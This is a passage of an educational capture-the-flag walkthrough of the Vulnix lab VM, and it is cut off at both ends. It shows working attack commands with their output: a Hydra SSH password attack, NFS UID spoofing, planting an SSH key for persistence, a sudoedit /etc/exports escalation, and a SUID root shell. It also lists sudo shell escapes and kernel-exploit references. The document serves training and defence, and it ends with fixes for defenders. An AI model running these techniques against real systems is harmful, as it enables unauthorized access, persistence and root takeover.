you keep enumerating — SSH brute force is slow.


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)

```bash
ls /usr/share/wordlists/
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
hydra -t 4 -l user -P /usr/share/wordlists/rockyou.txt -f -o hydra-user.txt ssh://192.168.56.101
```

```text
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-03 13:26:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344391 login tries (l:1/p:14344391), ~3586098 tries per task
[DATA] attacking ssh://192.168.56.101:22/
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344327 to do in 3735:20h, 4 active
[STATUS] 62.00 tries/min, 124 tries in 00:02h, ...
[22][ssh] host: 192.168.56.101   login: user   password: letmein
[STATUS] attack finished for 192.168.56.101 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-03 13:29:03
```

> **`user` / `letmein`.**
>
> A faster route if you want results in seconds rather than minutes — the top ~200
> common passwords contain `letmein`:
> ```bash
> hydra -t 4 -l user -P /usr/share/wordlists/fasttrack.txt -f ssh://192.168.56.101
> ```
> ```text
> [22][ssh] host: 192.168.56.101   login: user   password: letmein
> ```
>
> **Hydra flag reference:** `-t 4` threads (SSH servers rate-limit; more threads
> cause false negatives), `-l` single username, `-P` password file, `-f` stop on
> first success, `-o` write results to a file.
>
> **`letmein` is consistently in the global top-10 most-used passwords.** A box that
> is "fully patched" is still trivially breached by one weak password. That is the
> thesis of this entire VM.

### 3.3 Track 1b: `nfspy` — spoof the NFS identity

If you would rather not brute force, `nfspy` mounts the share while **faking the
client credentials**, so the server sees whatever UID/GID you claim.

```bash
sudo apt install nfspy
sudo mkdir -p /tmp/nfspy
sudo nfspy -o server=192.168.56.101:/home/vulnix,rw,intr,hide,allow_other /tmp/nfspy
ls -la /tmp/nfspy
```

```text
total 20
drwxr-x--- 2 2008 2008 4096 Sep  2  2012 .
drwxrwxrwt 3 root root 4096 May  3 13:31 ..
-rw-r--r-- 1 2008 2008  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 2008 2008 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 2008 2008  675 Apr  3  2012 .profile
```

> **There it is: UID 2008, GID 2008.** `nfspy` options:
> - `server=<host>:<export>` → the NFS target.
> - `rw` → read-write.
> - `hide` → hide the mount point's original contents.
> - `intr` → allow signals to interrupt operations (prevents hung shells).
> - `allow_other` → let users other than the one who mounted it access the FUSE
>   mount (needed for `su vulnix` in § 4).
>
> **Why this defeats the protection:** `nfspy` implements the NFS *client* protocol
> itself and sets the credentials in each RPC call to whatever you like. When it
> asks for a directory listing it can claim `uid=2008,gid=2008`. The server has no
> way to verify that claim — NFSv3 has **no authentication at all**. That is the
> fundamental weakness of NFSv2/v3 and the reason **NFSv4 with Kerberos (`sec=krb5p`)**
> exists.
>
> **We now know the target UID: 2008.**

### 3.4 Log in as `user` and confirm

```bash
ssh user@192.168.56.101
```


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```text
user@192.168.56.101's password: letmein
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Fri May  3 13:35:02 EDT 2024

  System load:  0.0               Processes:           132
  Usage of /:   22.7% of 7.21GB   Users logged in:     0
  Memory usage: 21%               IP address for eth0: 192.168.56.101
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Sun Sep  2 19:26:11 2012 from 192.168.56.1
user@vulnix:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),117(sambashare)
user@vulnix:~$ id vulnix
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
user@vulnix:~$ sudo -l
[sudo] password for user:
Sorry, user user may not run sudo on vulnix.
```

> - **`id vulnix` → `uid=2008(vulnix) gid=2008(vulnix)`** — confirms what `nfspy`
>   showed us.
> - `user` is in group `27(sudo)` but `sudo -l` says it may not run sudo. Slightly
>   contradictory; either way, no easy win.
> - **`3.2.0-29-generic-pae i686`** — Ubuntu 12.04, 32-bit, PAE kernel. And
>   "fully patched as of Sept 2012" means kernel exploits from 2013+ are *not*
>   applicable; the author designed it so that you must use the configuration flaws.

![SSH as user, confirming UID 2008](images/03-ssh-user.png)

---

## 4. Lateral movement — impersonating UID 2008 over NFS

**The core concept.** NFSv3 identifies clients by **numeric UID/GID only**. The
server does *not* check your hostname, your username, or any token. It just asks
*"what UID did this request come with?"* and applies that UID's permissions to the
file. Therefore: **if you can produce a request with UID 2008, you are `vulnix`** as
far as the NFS server is concerned — even though your machine has never heard of
that account.

Two ways to produce such a request. Method A is the cleanest and is what most
walkthroughs use.

### 4.1 Method A — create a local UID-2008 user and mount normally

```bash
# on Kali, as root
sudo groupadd -g 2008 vulnix
sudo useradd  -u 2008 -g 2008 -d /home/vulnix -m vulnix
id vulnix
```

```text
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
```

```bash
sudo mkdir -p /tmp/mnt
sudo umount /tmp/mnt 2>/dev/null
sudo mount -t nfs -o vers=3,nolock 192.168.56.101:/home/vulnix /tmp/mnt
sudo ls -la /tmp/mnt
```

```text
ls: cannot open directory '/tmp/mnt': Permission denied
```

> Still denied — because *you are running `ls` as root*, and root is squashed to
> `nobody`. **Become the UID-2008 user first:**

```bash
sudo su - vulnix
$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
$ ls -la /tmp/mnt
total 20
drwxr-x--- 2 vulnix vulnix 4096 Sep  2  2012 .
drwxrwxrwt 3 root   root   4096 May  3 13:40 ..
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
```

> **We are inside `vulnix`'s home directory on the remote machine.** The names now
> display as `vulnix` because our local `/etc/passwd` maps UID 2008 to that name —
> a nice demonstration that the *name* is purely local cosmetics; only the *number*
> crossed the wire.
>
> **`vers=3`** forces NFSv3. NFSv4 hides the owner UID behind a name-mapping layer
> (`idmapd`), which would defeat this attack. `nolock` skips the NLM lock manager,
> avoiding hangs.

### 4.2 Method B — `nfspy` (no local user needed)

If you used § 3.3, you are already in. Configure `nfspy` to present UID 2008:

```bash
sudo nfspy -o server=192.168.56.101:/home/vulnix,rw,intr,hide,allow_other,nfsvers=3 /tmp/nfspy
```

### 4.3 Plant an SSH public key

Now that we can write to `/home/vulnix`, we give ourselves legitimate SSH access —
no password needed.

**On Kali — generate a keypair:**

```bash
ssh-keygen -t rsa -b 2048 -f ./vulnix_key -N ''
```

```text
Generating public/private rsa key pair.
Your identification has been saved in ./vulnix_key
Your public key has been saved in ./vulnix_key.pub
The key fingerprint is:
SHA256:9xQ2mK7pL4vR8tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq4 root@kali
The key's randomart image is:
+---[RSA 2048]----+
|      . o+.      |
|     . o+o.      |
...
+----[SHA256]-----+
```

> - `-t rsa -b 2048` → RSA, 2048 bits. (Use `-t ed25519` on modern servers; we use
>   RSA here because **OpenSSH 5.9 on the target may not accept ed25519** — it was
>   added in OpenSSH 6.5.)
> - `-f ./vulnix_key` → write to this file rather than `~/.ssh/id_rsa`.
> - `-N ''` → **empty passphrase** for the key. (In real life always set one; here it
>   keeps the walkthrough readable.)

**Write it into the remote `authorized_keys`:**


> ### 📖 Concept — SSH keys: the credential people forget
>
> An SSH **private key** is a credential exactly like a password, and finding one is
> often better than finding a password: no cracking, no lockout, no log noise from
> failed attempts.
>
> | File | What it is |
> | --- | --- |
> | `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa` | **Private** key — never leaves the owner's machine. If you find one, you have that user's access. |
> | `~/.ssh/id_rsa.pub` | Public key — harmless on its own |
> | `~/.ssh/authorized_keys` | Public keys **permitted to log in as this user**. Writable? Append your own key and log in with no password. |
> | `~/.ssh/known_hosts` | Hosts this user has connected to — **a map of other machines to pivot toward** |
>
> ```bash
> ssh -i id_rsa user@target
> ssh -i id_rsa -o IdentitiesOnly=yes user@target      # ignore ssh-agent, use only this key
> ```
>
> **If the key is passphrase-protected**, crack it offline — you never touch the
> server:
>
> ```bash
> ssh2john id_rsa > key.hash
> john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
> # or:  hashcat -m 22921 -a 0 key.hash rockyou.txt    (22931 for ed25519)
> ```
>
> **Writing your own key is the cleanest persistence there is:**
>
> ```bash
> ssh-keygen -t ed25519 -f labkey -N ''                # -N '' = no passphrase
> cat labkey.pub >> /home/user/.ssh/authorized_keys    # if you can write it
> chmod 600 /home/user/.ssh/authorized_keys            # ssh refuses loose permissions
> ssh -i labkey user@target
> ```
>
> Note the `chmod 600` — `sshd` **silently ignores** an `authorized_keys` with overly
> permissive modes, which makes "my key does not work" a permissions problem more
> often than a key problem.
>
> **Always try a found key against *every* user on *every* host** you know about. Key
> reuse across machines and accounts is extremely common.
>
> **Deep dive:** [CONCEPTS §9.9 — SSH](../../docs/CONCEPTS.md#99-ssh--port-22) ·
> [§16.2 — Harvesting credentials](../../docs/CONCEPTS.md#162-harvesting-credentials)

```bash
sudo su - vulnix
$ mkdir -p /tmp/mnt/.ssh
$ chmod 700 /tmp/mnt/.ssh
$ cat /home/kali/vulnix_key.pub > /tmp/mnt/.ssh/authorized_keys
$ chmod 600 /tmp/mnt/.ssh/authorized_keys
$ ls -la /tmp/mnt/.ssh
```

```text
total 12
drwx------ 2 vulnix vulnix 4096 May  3 13:47 .
drwxr-x--- 3 vulnix vulnix 4096 May  3 13:47 ..
-rw------- 1 vulnix vulnix  398 May  3 13:47 authorized_keys
```

> **Permissions here are not optional.** `sshd` refuses to use `authorized_keys`
> unless the ownership and modes are right. The rules:
> ```text
> /home/vulnix              must not be group/world-writable   (755 or 750)
> /home/vulnix/.ssh         700, owned by vulnix
> /home/vulnix/.ssh/authorized_keys   600, owned by vulnix
> ```
> If any of these is wrong you get the famously opaque
> `Permission denied (publickey)` and hours of confusion. Check
> `StrictModes yes` in `/etc/ssh/sshd_config` — that is the setting enforcing this.
>
> **Also verify the file landed on the *target*, not just locally:**
> ```bash
> user@vulnix:~$ ls -la /home/vulnix/.ssh/
> total 12
> drwx------ 2 vulnix vulnix 4096 May  3 13:47 .
> -rw------- 1 vulnix vulnix  398 May  3 13:47 authorized_keys
> ```

**Fix local key permissions and connect:**

```bash
chmod 600 ./vulnix_key
ssh -i ./vulnix_key \
    -o KexAlgorithms=+diffie-hellman-group14-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    vulnix@192.168.56.101
```

```text
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/
Last login: Sun Sep  2 19:31:44 2012 from 192.168.56.10
vulnix@vulnix:~$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
vulnix@vulnix:~$ pwd
/home/vulnix
```

**We are `vulnix`, with a proper interactive SSH session.** ✅

![SSH as vulnix using the planted key](images/04-vulnix.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 5. Privilege escalation — `sudoedit /etc/exports`

### 5.1 The discovery

```bash
vulnix@vulnix:~$ sudo -l
```

```text
Matching Defaults entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```

> **Read that line very carefully.** Two entries are listed:
> 1. `(root) sudoedit /etc/exports` → may run it as root *with* a password.
> 2. `(root) NOPASSWD: sudoedit /etc/exports` → may run it as root **without any
>    password at all**.
>
> **`sudoedit`** is sudo's safe-edit mode: it copies the file to a temporary
> location, launches your `$EDITOR` on the copy **as your own user**, then copies the
> result back over the original **as root**. It exists so administrators can let
> users edit config files without handing them a root shell.
>
> **Why it is catastrophic here:** `/etc/exports` is *the* NFS access-control file.
> Granting edit rights to it is granting rights to rewrite the entire NFS security
> policy. Whoever can edit `/etc/exports` decides which directories are shared, to
> whom, and with which privilege semantics — **including `no_root_squash`, which
> turns off the protection we spent § 3 fighting against.**
>
> **This is the misconfiguration the author wants you to find.** Not a CVE. Not a
> buffer overflow. A single over-broad line in `/etc/sudoers`.

### 5.2 Read the current policy

```bash
vulnix@vulnix:~$ cat /etc/exports
```

```text
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix    *(rw,root_squash)
```

> **The active line:** `/home/vulnix *(rw,root_squash)`
>
> | Field | Meaning |
> | --- | --- |
> | `/home/vulnix` | the directory being exported |
> | `*` | **any client may mount it** |
> | `rw` | read **and write** |
> | `root_squash` | incoming UID 0 is remapped to `nobody` |
>
> Missing but relevant: `sync` vs `async` (write semantics), `no_subtree_check`
> (performance/security tradeoff), and `sec=` (authentication flavour — absent means
> `AUTH_SYS`, i.e. *no real authentication*).
>
> Also note the commented examples reference **`gss/krb5i`** — Kerberos-authenticated
> NFSv4. The author is showing you what a *secure* export looks like, right above the
> insecure one.

### 5.3 Rewrite the policy

```bash
vulnix@vulnix:~$ sudoedit /etc/exports
```

*(sudoedit launches your editor — `nano` or `vi` — on a temporary copy. Append the
new line, save, exit. sudo then writes it back as root.)*

```text
/home/vulnix    *(rw,root_squash)
/root           *(rw,no_root_squash)
```

Verify:

```bash
vulnix@vulnix:~$ cat /etc/exports | grep -v '^#' | grep -v '^$'
```

```text
/home/vulnix    *(rw,root_squash)
/root           *(rw,no_root_squash)
```

> **What we just did:** we told the NFS server to export **root's entire home
> directory** to **any client**, read-write, with **`no_root_squash`** — meaning a
> connecting client's UID 0 will be honoured *as UID 0* on the server. Since we are
> root on our own Kali box, we will arrive as root.
>
> **`no_root_squash` is essentially "disable NFS's only access control".** It should
> never be used, and its presence in a real `/etc/exports` is an immediate critical
> finding. The only semi-legitimate use is diskless-workstation boot images, and even
> then `root_squash` plus Kerberos is preferred.

### 5.4 Make the server re-read the configuration

NFS only reads `/etc/exports` at export time. Applying it needs either
`exportfs -ra` (requires root on the target — we do not have it yet) or a **service
restart / reboot**.

**Option A — reboot the target from the console or via any privileged channel.**
In VirtualBox: *Machine → Reset* (`Ctrl+R` on the VM window).

```bash
# watch it come back
ping -c 20 192.168.56.101
```

```text
PING 192.168.56.101 (192.168.56.101) 56(84) bytes of data.
64 bytes from 192.168.56.101: icmp_seq=8 ttl=64 time=0.412 ms
...
```

**Option B — if you already have any root code execution on the target** (e.g. via a
SUID bash planted in § 5.6):

```bash
# exportfs -ra
```

Confirm the new export is live:

```bash
showmount -e 192.168.56.101
```

```text
Export list for 192.168.56.101:
/root          *
/home/vulnix   *
```

> **Both exports are now visible.** The policy change took effect.

![showmount now listing /root](images/05-exports.png)

### 5.5 Mount `/root` and take the trophy

```bash
sudo mkdir -p /tmp/r00t
sudo mount -t nfs -o vers=3,nolock 192.168.56.101:/root /tmp/r00t
sudo ls -la /tmp/r00t
```

```text
total 32
drwx------  4 root root 4096 Sep  2  2012 .
drwxrwxrwt 22 root root 4096 May  3 14:02 ..
-rw-------  1 root root    0 Sep  2  2012 .bash_history
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
drwx------  2 root root 4096 Sep  2  2012 .cache
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
drwxr-xr-x  2 root root 4096 Sep  2  2012 .ssh
-r--------  1 root root   33 Sep  2  2012 trophy.txt
-rw-------  1 root root  710 Sep  2  2012 .viminfo
```

```bash
sudo cat /tmp/r00t/trophy.txt
```

```text
cc614640424f5bd60ce5d5264899c3be
```

**Trophy captured.** ✅

> **Note `trophy.txt` is `-r--------` (mode 400)** — readable *only* by root. We can
> read it because we mounted with `no_root_squash` and we are root on Kali, so the
> server treats our read request as coming from UID 0.
>
> Confirm the identity:
> ```bash
> sudo id
> uid=0(root) gid=0(root) groups=0(root)
> ```

![trophy.txt contents](images/06-trophy.png)

### 5.6 Alternative escalation — a persistent SUID root shell

Instead of exporting `/root` (which needs a reboot), export `/home/vulnix` with
`no_root_squash` and plant a SUID bash in it:

```bash
# on the target, as vulnix
vulnix@vulnix:~$ sudoedit /etc/exports
```

```text
/home/vulnix    *(rw,no_root_squash)
```

Reboot the target, then on Kali:

```bash
sudo umount /tmp/mnt
sudo mount -t nfs -o vers=3,nolock 192.168.56.101:/home/vulnix /tmp/mnt
sudo cp /bin/bash /tmp/mnt/rootshell          # as root on Kali; lands on the target
sudo chmod 4755 /tmp/mnt/rootshell            # 4755 = SUID + rwxr-xr-x
sudo ls -l /tmp/mnt/rootshell
```

```text
-rwsr-xr-x 1 root root 1037520 May  3 14:11 /tmp/mnt/rootshell
```

Now on the target, as any user:

```bash
vulnix@vulnix:~$ /home/vulnix/rootshell -p
root@vulnix:~# id
uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)
root@vulnix:~# cat /root/trophy.txt
cc614640424f5bd60ce5d5264899c3be
```

> **`chmod 4755`** — the leading **`4`** is the **SUID** bit. The resulting mode
> `-rwsr-xr-x` means *"whoever executes this runs it as the file's owner (root)."*
>
> **The `-p` flag is mandatory.** Bash *drops* its effective UID on startup unless
> invoked with `-p` ("privileged mode"), specifically to stop exactly this attack.
> Forgetting `-p` and getting a `$` prompt instead of `#` is the classic beginner
> confusion here.
>
> **`euid=0(root)` with `uid=2008(vulnix)`** — real UID stays vulnix, *effective* UID
> becomes 0. Permission checks use the effective UID, so this is a full root shell.
>
> **Defender note:** a SUID-root copy of a shell in a user's home directory is one of
> the most reliable rootkit/backdoor indicators there is. Hunt for it:
> ```bash
> find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -printf '%M %u %p\n' 2>/dev/null
> ```
> and diff the result against a known-good baseline.

---

## 6. Other paths you should know about (and why they fail here)

Documenting dead ends is part of professional reporting.

### 6.1 Kernel exploits

```bash
uname -a
```

```text
Linux vulnix 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
```

```bash
# Linux Exploit Suggester
bash linux-exploit-suggester.sh -k 3.2.0-29-generic-pae
```


> ### 📖 Concept — Kernel exploits: how to match one, and why to use them last
>
> ```bash
> uname -a; cat /proc/version; cat /etc/os-release
> searchsploit linux kernel $(uname -r | cut -d- -f1)
> ```
>
> Cross-reference the version at <https://www.linuxkernelcves.com/> and
> <https://github.com/SecWiki/linux-kernel-exploits>. Frequent favourites:
>
> | Exploit | Kernel | Mechanism |
> | --- | --- | --- |
> | **Dirty COW** (CVE-2016-5195) | < 4.8.3 | Race in copy-on-write → write any file |
> | **Overlayfs** (CVE-2015-1328) | Ubuntu 3.13–3.19 | Namespace + setuid → root |
> | **PwnKit** (CVE-2021-4034) | polkit < 0.120 | `pkexec` memory corruption |
> | **Baron Samedit** (CVE-2021-3156) | sudo < 1.9.5p2 | `sudoedit` heap overflow |
> | **Dirty Pipe** (CVE-2022-0847) | 5.8 – 5.16.11 | Page-cache write → overwrite any file |
>
> **Match the architecture too.** A 32-bit target (`i686` in `uname -a`) needs the
> 32-bit build; a mismatched exploit fails with a confusing error. Compile with the
> flags the author specifies — Dirty COW's `40847.cpp` needs
> `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`.
>
> > ⚠️ **Use kernel exploits last.** They can panic the VM, corrupt the filesystem
> > and cost you a full re-import. If a clean misconfiguration path exists — `sudo`,
> > SUID, capabilities, cron, a writable file — take it. Kernel exploitation is the
> > fallback when the administrator got everything else right.
>
> **Read the exploit before running it.** Many public entries are unverified and some
> are hostile to whoever runs them. `searchsploit -x <id>` and understand it.
>
> **Deep dive:** [CONCEPTS §15.7 — Kernel exploits](../../docs/CONCEPTS.md#157-kernel-exploits)

```text
[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson
   Details: http://vulnfactory.org/exploits/full-nelson.c
   Exposure: probable
[+] [CVE-2013-2094] perf_swevent
   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: probable
[+] [CVE-2016-5195] dirtycow
   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: probable
```

> All three of these post-date the kernel's "fully patched as of Sept 2012" state as
> the author intended — the box's package set blocks them or they simply do not apply
> to this configuration. Several published walkthroughs report trying two or three
> kernel exploits unsuccessfully before finding the `/etc/exports` route. **That is
> the lesson:** if exploits fail, stop hunting for CVEs and start reading
> configuration.
>
> (`dirtycow`/CVE-2016-5195 is worth trying on your own copy — kernel 3.2.0-29 is
> technically in range, and some revisions of the image do yield to it. If it works,
> you get root in one step.)

### 6.2 The `r`-services on 512/513/514

```bash
rlogin -l user 192.168.56.101
```

```text
rlogin: connect to address 192.168.56.101: Connection refused
```

```bash
nmap -p 512,513,514 --script rsh-run 192.168.56.101
```

> These daemons (`rexecd`, `rlogind`, `rshd`) authenticate via `.rhosts` and are
> reachable, but require an existing trust relationship. They are attack surface with
> no immediate payoff here — but in a real engagement, finding them means: **look for
> `.rhosts` files, look for `+ +` entries (which mean "trust everyone"), and pivot.**

### 6.3 POP3/IMAP

```bash
nmap -p 110,143 --script pop3-capabilities,imap-capabilities,pop3-ntlm-info 192.168.56.101
```

```text
PORT    STATE SERVICE
110/tcp open  pop3
| pop3-capabilities:
|   TOP
|   UIDL
|   STLS
|   SASL
|   CAPA
|   RESP-CODES
|_  PIPELINING
143/tcp open  imap
```

> No readable mailboxes without credentials. `STLS`/`STARTTLS` means plaintext auth
> can be upgraded — but by default Dovecot here would accept plaintext `LOGIN`. With
> a username list from § 2.3 you could run:
> ```bash
> hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 pop3://192.168.56.101
> ```
> Worth trying; not required.

![nmap showing the r-services and mail ports](images/07-services.png)

---

## 7. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | **NFS export open to the world (`*`)** | `/etc/exports`: `/home/vulnix *(rw,root_squash)` | Any host can attempt to mount a user's home directory |
| 2 | **NFSv3 `AUTH_SYS` — no real authentication** | port 2049 | Client identity is a self-declared UID; trivially spoofed (`nfspy`) |
| 3 | **`rpcbind`/`mountd` exposed** | ports 111, 51573 | Export list disclosed to anyone (`showmount -e`) |
| 4 | **`finger` service enabled** | port 79 | Full account list + home dirs + shells + login times |
| 5 | **SMTP `VRFY` enabled** | port 25 (Postfix) | Account enumeration |
| 6 | **Weak SSH password** | `user` → `letmein` | Interactive foothold |
| 7 | **Legacy `r`-services exposed** | ports 512/513/514 | Plaintext remote execution surface |
| 8 | **`sudoedit` on a security-critical file, NOPASSWD** | `/etc/sudoers`: `vulnix ALL=(root) NOPASSWD: sudoedit /etc/exports` | Rewrite the entire NFS security policy → **root** |
| 9 | **`no_root_squash` after the policy rewrite** | `/etc/exports` | Local root on Kali = remote root on the target |
| 10 | Deprecated SSH algorithms (SHA-1 KEX, `ssh-dss`) | OpenSSH 5.9p1 | Weak transport security |
| 11 | Root's home directory world-exportable | `/root` | Trophy/credentials readable remotely |

## 8. Defensive lessons (blue team)

1. **Never export to `*`.** Bind exports to specific hosts, subnets or netgroups:
   ```text
   /home/vulnix    192.168.56.0/24(rw,sync,no_subtree_check,root_squash)
   ```
   Better, use a **netgroup** from LDAP/NI so membership is centrally managed:
   ```text
   /srv/data    @eng-netgroup(rw,sync,no_subtree_check)
   ```
2. **Never use `no_root_squash`.** It disables the only access control NFSv3 has.
   If a client genuinely needs root-equivalent access, give it a *named* export with
   Kerberos instead.
3. **Use NFSv4 with Kerberos.** `sec=krb5p` gives authentication *and* integrity
   *and* encryption, replacing the spoofable numeric UID with a real principal:
   ```text
